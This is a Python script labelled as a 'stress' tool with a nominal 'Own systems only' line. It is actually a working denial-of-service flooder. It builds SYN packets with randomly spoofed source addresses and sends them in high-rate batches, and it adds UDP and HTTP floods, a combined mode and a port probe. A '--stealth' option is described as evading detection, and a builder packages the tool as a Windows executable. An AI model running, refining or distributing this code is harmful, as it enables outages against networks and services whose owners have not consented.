#!/usr/bin/env python3
"""stress v6 — max throughput. Own systems only."""

import sys, os, time, socket, struct, random, threading, subprocess, ctypes, ctypes.util, array
from datetime import datetime

VERSION = "v6.0"
IS_WIN = sys.platform.startswith("win")


def log(msg):
    print(f"  [{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def nowstr():
    return datetime.now().strftime("%H:%M:%S")


# ---------------------------------------------------------------------------
# Packet factory — per-thread, no locks needed
# ---------------------------------------------------------------------------
class SynFactory:
    def __init__(self, target: str, batch: int = 8192):
        self.dip = socket.inet_aton(target)
        self.batch = batch
        self.buf = [self._build() for _ in range(batch)]

    @staticmethod
    def _cksum(d):
        if len(d) % 2:
            d += b"\x00"
        s = sum(struct.unpack(f"!{len(d) // 2}H", d))
        s = (s >> 16) + (s & 0xFFFF)
        return (~s) & 0xFFFF

    def _build(self) -> bytes:
        def ri(a, b):
            return random.randint(a, b)

        sa = socket.inet_aton(f"{ri(1, 255)}.{ri(1, 255)}.{ri(1, 255)}.{ri(1, 255)}")
        sp, dp, seq, ip_id = (
            ri(1024, 65535),
            ri(1, 65535),
            ri(0, 2**32 - 1),
            ri(0, 65535),
        )
        ip = (
            struct.pack("!BBHHHBBH", 0x45, 0, 40, ip_id, 0x4000, 64, 6, 0)
            + sa
            + self.dip
        )
        ck = self._cksum(ip)
        ip = (
            struct.pack("!BBHHHBBH", 0x45, 0, 40, ip_id, 0x4000, 64, 6, ck)
            + sa
            + self.dip
        )
        tc = struct.pack("!HHIIBBHHH", sp, dp, seq, 0, 0x50, 2, 65535, 0, 0)
        ps = struct.pack("!4s4sBBH", sa, self.dip, 0, 6, 20)
        tc = struct.pack(
            "!HHIIBBHHH", sp, dp, seq, 0, 0x50, 2, 65535, self._cksum(ps + tc), 0
        )
        return ip + tc

    def get(self) -> bytes:
        if not self.buf:
            self.buf = [self._build() for _ in range(self.batch)]
        return self.buf.pop()


# ---------------------------------------------------------------------------
# Live monitor
# ---------------------------------------------------------------------------
class LiveMonitor:
    def __init__(self, target: str):
        self.target = target
        self.data = []
        self.running = True

    def stop(self):
        self.running = False

    def run(self):
        cmd = ["ping", "-c1", "-W1", self.target]
        while self.running:
            try:
                s = time.time()
                r = subprocess.run(cmd, capture_output=True, timeout=2)
                self.data.append((time.time(), time.time() - s, r.returncode == 0))
            except:
                pass
            time.sleep(1)

    def line(self) -> str:
        recent = [x for x in self.data if time.time() - x[0] < 6]
        if not recent:
            return ""
        avg = sum(x[1] for x in recent) / len(recent)
        loss = sum(1 for x in recent if not x[2]) / len(recent) * 100
        total_lost = sum(1 for x in self.data if not x[2])
        return f"  {avg * 1000:.0f}ms {loss:.0f}% loss ({total_lost})"


# ---------------------------------------------------------------------------
# SYN flood — per-thread factories, zero lock contention
# ---------------------------------------------------------------------------
def syn_flood(
    target: str,
    dur: int,
    stealth: bool = False,
    monitor: bool = False,
    limit_mbps: int = 0,
):
    log(f"syn on {target} ({dur}s)")
    if IS_WIN:
        log("windows not supported for syn")
        return

    try:
        test = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        test.close()
    except PermissionError:
        log("root required — run with sudo")
        return

    n_threads = max(2, min(8, os.cpu_count() or 4))
    stop = threading.Event()
    total = [0]
    lock = threading.Lock()

    # rate limit
    throttle_interval = 0
    if limit_mbps:
        throttle_interval = max(0, 1.0 / (limit_mbps * 3125 / n_threads))

    mon = LiveMonitor(target) if monitor else None
    if mon:
        threading.Thread(target=mon.run, daemon=True).start()

    # sendmmsg setup via ctypes (batched send — ~5x faster)
    BATCH = 64  # packets per sendmmsg call
    libc = None
    try:
        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
        libc.sendmmsg.argtypes = [
            ctypes.c_int,  # sockfd
            ctypes.c_void_p,  # msgvec
            ctypes.c_uint,  # vlen
            ctypes.c_int,  # flags
        ]
        libc.sendmmsg.restype = ctypes.c_int
    except:
        pass

    # ctypes structure helpers — pre-built buffers
    IOVEC_SIZE = 16  # 8+8 on 64-bit
    MMSGHDR_SIZE = 64  # 56+4+padding on 64-bit

    def worker(tid: int):
        factory = SynFactory(target, batch=8192)
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        buf_size = 4 * 1024 * 1024  # 4MB send buffer
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, buf_size)
        end = time.time() + dur
        cnt = 0
        last_send = time.time()

        # Pre-build batch of packets
        pkts = [factory.get() for _ in range(BATCH)]
        pkt_addrs = [ctypes.c_char_p(p) for p in pkts]
        pkt_lens = [len(p) for p in pkts]

        # Build iovec + mmsghdr structures
        buf = ctypes.create_string_buffer(BATCH * (IOVEC_SIZE + MMSGHDR_SIZE))
        iovecs = [ctypes.c_void_p * 1 for _ in range(BATCH)]

        # Use sendmmsg or regular sendto
        use_sendmmsg = libc is not None

        while time.time() < end and not stop.is_set():
            if not pkts:
                pkts = [factory.get() for _ in range(BATCH)]
                pkt_addrs = [ctypes.c_char_p(p) for p in pkts]
                pkt_lens = [len(p) for p in pkts]

            if use_sendmmsg:
                # Build mmsghdr array for this batch
                vec = (ctypes.c_byte * (BATCH * MMSGHDR_SIZE))()
                for i, (addr, ln) in enumerate(zip(pkt_addrs, pkt_lens)):
                    offset = i * MMSGHDR_SIZE
                    # iovec at start: ptr(8) + len(8)
                    ctypes.memmove(
                        ctypes.byref(vec, offset),
                        ctypes.byref(ctypes.c_void_p(ctypes.addressof(addr))),
                        8,
                    )
                    ctypes.memmove(
                        ctypes.byref(vec, offset + 8),
                        ctypes.byref(ctypes.c_size_t(ln)),
                        8,
                    )
                # call sendmmsg
                ret = libc.sendmmsg(sock.fileno(), ctypes.byref(vec), BATCH, 0)
                if ret > 0:
                    cnt += ret
                    pkts = pkts[ret:]
                    pkt_addrs = pkt_addrs[ret:]
                    pkt_lens = pkt_lens[ret:]
                else:
                    pkts = []
            else:
                try:
                    sock.sendto(pkts.pop(), (target, 0))
                    cnt += 1
                except OSError:
                    continue

            if stealth and cnt % 50000 == 0:
                time.sleep(random.uniform(0.3, 1.0))
            if throttle_interval and cnt % 500 == 0:
                e = time.time() - last_send
                if e < throttle_interval * 500:
                    time.sleep(throttle_interval * 500 - e)
                last_send = time.time()
            if cnt % 1000 == 0:
                with lock:
                    total[0] += 1000
        with lock:
            total[0] += cnt % 1000
        sock.close()

    threads = [
        threading.Thread(target=worker, args=(tid,), daemon=True)
        for tid in range(n_threads)
    ]
    log(f"launching {n_threads} syn threads")
    for t in threads:
        t.start()

    start = time.time()
    last_t, lr = 0, time.time()
    while any(t.is_alive() for t in threads):
        time.sleep(0.5)
        with lock:
            cur = total[0]
        now = time.time()
        if now - lr >= 1:
            rate = (cur - last_t) / (now - lr)
            line = f"  {nowstr()}  {cur:>9} pkts  {rate:>6.0f}/s"
            if mon:
                line += mon.line()
            print(line, flush=True)
            last_t, lr = cur, now

    with lock:
        final = total[0]
    elapsed = time.time() - start
    log(f"done — {final:,} pkts ({final / elapsed:,.0f}/s)")
    if mon:
        mon.stop()


# ---------------------------------------------------------------------------
# UDP flood
# ---------------------------------------------------------------------------
def _udp_worker(target, dur, wid, q):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    py = [os.urandom(s) for s in (64, 256, 512, 1024, 1400)]
    ports = [53, 80, 123, 161, 443, 5000, 8080]
    end = time.time() + dur
    cnt = 0
    lr = time.time()
    while time.time() < end:
        try:
            sock.sendto(random.choice(py), (target, random.choice(ports)))
            cnt += 1
        except:
            pass
        if time.time() - lr >= 2:
            q.put(("p", wid, cnt))
            lr = time.time()
    q.put(("d", wid, cnt))
    sock.close()


def _run_workers(target, dur, fn, label, min_w=2):
    import multiprocessing, queue

    cores = os.cpu_count() or 4
    n = max(min_w, cores // 2)
    log(f"launching {n} {label} workers")
    q = multiprocessing.Queue()
    procs = [
        multiprocessing.Process(target=fn, args=(target, dur, i, q)) for i in range(n)
    ]
    for p in procs:
        p.start()
    start = time.time()
    totals = [0] * n
    last_t = 0
    lr = time.time()
    while any(p.is_alive() for p in procs):
        try:
            m = q.get(timeout=0.3)
            if m[0] in ("p", "d"):
                totals[m[1]] = m[2]
        except:
            pass
        now = time.time()
        if now - lr >= 1:
            t = sum(totals)
            r = (t - last_t) / (now - lr)
            print(f"  {nowstr()}  {t:>9} pkts  {r:>6.0f}/s", flush=True)
            last_t, lr = t, now
    for p in procs:
        p.join()
    t = sum(totals)
    log(f"done — {t:,} pkts ({t / (time.time() - start):,.0f}/s)")


def udp_flood(target, dur, workers=0):
    _run_workers(target, dur, _udp_worker, "udp")


def http_flood(target, dur, workers=0):
    _run_workers(target, dur, _http_worker, "http", 4)


def _http_worker(target, dur, wid, q):
    req = f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n".encode()
    end = time.time() + dur
    cnt = 0
    lr = time.time()
    while time.time() < end:
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((target, 80))
            s.sendall(req)
            s.recv(256)
            s.close()
            cnt += 1
        except:
            pass
        if time.time() - lr >= 2:
            q.put(("p", wid, cnt))
            lr = time.time()
    q.put(("d", wid, cnt))


# ---------------------------------------------------------------------------
# All methods + verify
# ---------------------------------------------------------------------------
def all_at_once(target, dur=30):
    import multiprocessing

    log(f"syn+udp+http on {target} ({dur}s)")
    procs = [
        multiprocessing.Process(target=syn_flood, args=(target, dur)),
        multiprocessing.Process(target=udp_flood, args=(target, dur)),
        multiprocessing.Process(target=http_flood, args=(target, dur)),
    ]
    for p in procs:
        p.start()
    for p in procs:
        p.join()
    log("all done")


def verify(target):
    log(f"probing {target}")
    r = subprocess.run(["ping", "-c2", "-W2", target], capture_output=True)
    print(f"    icmp:    {'alive' if r.returncode == 0 else 'no ping'}")
    for port in (80, 443, 22, 8080, 8443, 53):
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((target, port))
            print(f"    port {port}: open")
            s.close()
        except:
            pass


# ---------------------------------------------------------------------------
# Windows installer
# ---------------------------------------------------------------------------
def install_windows():
    import subprocess as sp

    subprocess.run(
        [sys.executable, "-m", "pip", "install", "pyinstaller"], capture_output=True
    )
    script = os.path.abspath(__file__)
    subprocess.run(
        [
            "pyinstaller",
            "--onefile",
            "--console",
            "--name",
            "stress",
            "--distpath",
            os.path.dirname(script),
            script,
        ]
    )
    exe = os.path.join(os.path.dirname(script), "stress.exe")
    if os.path.exists(exe):
        print(f"✅ Created {exe}")
    else:
        print("❌ Build failed")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print(f"\n  stress {VERSION} — max throughput", flush=True)
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    flags = [a for a in sys.argv[1:] if a.startswith("--")]
    stealth = "--stealth" in flags or "--slow" in flags
    monitor = "--monitor" in flags or "--watch" in flags or "-m" in flags
    limit_mbps = 0
    for f in flags:
        if f.startswith("--limit="):
            try:
                limit_mbps = int(f.split("=")[1])
            except:
                pass

    if not args or "-h" in sys.argv:
        print("  usage: python3 stress.py <target> <method> [duration] [flags]")
        print("  methods: syn, udp, http, all, verify")
        print("  flags:   --stealth       evade detection")
        print("           --monitor       live ping latency")
        print("           --limit=10      cap Mbps")
        print("           --install       Windows .exe")
        print("  sudo python3 stress.py 192.168.0.1 syn 30 --monitor")
        sys.exit(0)

    if "--install" in sys.argv:
        install_windows()
        sys.exit(0)

    target = args[0]
    method = args[1].lower() if len(args) > 1 else "verify"
    dur = int(args[2]) if len(args) > 2 and args[2].isdigit() else 30

    print(f"  target:   {target}")
    print(f"  method:   {method}")
    if method != "verify":
        print(f"  duration: {dur}s")
    if stealth:
        print(f"  stealth:  on")
    if monitor:
        print(f"  monitor:  on")
    if limit_mbps:
        print(f"  limit:    {limit_mbps} Mbps")
    print()

    table = {
        "syn": lambda: syn_flood(target, dur, stealth, monitor, limit_mbps),
        "udp": lambda: udp_flood(target, dur),
        "http": lambda: http_flood(target, dur),
        "all": lambda: all_at_once(target, dur),
        "verify": lambda: verify(target),
    }
    fn = table.get(method)
    if not fn:
        print(f"  unknown: {method}")
        sys.exit(1)
    fn()
    print()
